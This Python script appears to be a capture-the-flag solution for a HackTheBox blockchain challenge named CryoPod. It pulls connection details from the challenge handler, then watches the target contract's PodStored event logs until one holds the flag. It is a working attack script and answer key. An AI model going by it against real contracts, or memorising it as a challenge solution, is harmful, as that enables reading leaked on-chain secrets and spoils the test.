#!/usr/bin/env python3

import time
import json
from web3 import Web3
from pwn import remote, context, args

context.log_level = "DEBUG"

if args.REMOTE:
    IP = args.HOST
    RPC_PORT = int(args.RPC_PORT)
    TCP_PORT = int(args.HANDLER_PORT)
    RPC_URL = f"http://{IP}:{RPC_PORT}/"
    HANDLER_URL = (IP, TCP_PORT)
else:
    RPC_URL = "http://localhost:8888/"
    HANDLER_URL = ("localhost", 8000)


if __name__ == "__main__":
    connection_info = {}
    handler_host, handler_port = HANDLER_URL
    
    ### connect to challenge handler and get connection info ##
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"1")
        data = p.recvall()

    lines = data.decode().split('\n')
    for line in lines:
        if line.startswith("[*]"):
            continue
        if line:
            key, value = line.split(': ')
            key = key.strip()
            value = value.strip()
            connection_info[key] = value

    pvk = connection_info['Player Private Key']
    setup_addr = connection_info['Setup contract']
    target_addr = connection_info['Target contract']
    with open("./contracts/compiled/CryoPod.sol/CryoPod.json", "r") as f:
        target_abi = json.load(f)["abi"]

    ### exploitation ###
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    assert w3.is_connected(), "Failed to connect to RPC"
    print("[*] Connected to RPC")

    CryoPod = w3.eth.contract(address=target_addr, abi=target_abi)
    event_filter = CryoPod.events.PodStored.create_filter(from_block=1)
    print("[*] Subscribed to event PodStored")

    # fetch all past events
    events = event_filter.get_all_entries()
    for block_n, event in enumerate(events, 1):
        print(f"\n[*] Processing event @ block {block_n}")
        print(f"    [>] User: {event.args.user}")
        print(f"    [>] Data: {event.args.data}")
        if "HTB{" in event.args.data:
            print(f"\n\n[!] Flag found: {event.args.data}")
            break
    else:
        # poll for new events
        while True:
            print("\n[*] Searching for flag...")
            events = event_filter.get_new_entries()
            for event in events:
                print(f"[*] New event detected:")
                print(f"    [>] User: {event.args.user}")
                print(f"    [>] Data: {event.args.data}")
                if "HTB{" in event.args.data:
                    print(f"\n\n[!] Flag found: {event.args.data}")
                    exit(0)
            time.sleep(5)

    # get flag
    #with remote(handler_host, handler_port) as p:
    #    p.sendlineafter(b": ", b"3"
    #    flag = p.recvall()
    #print(f"[*] Flag: {flag}")
        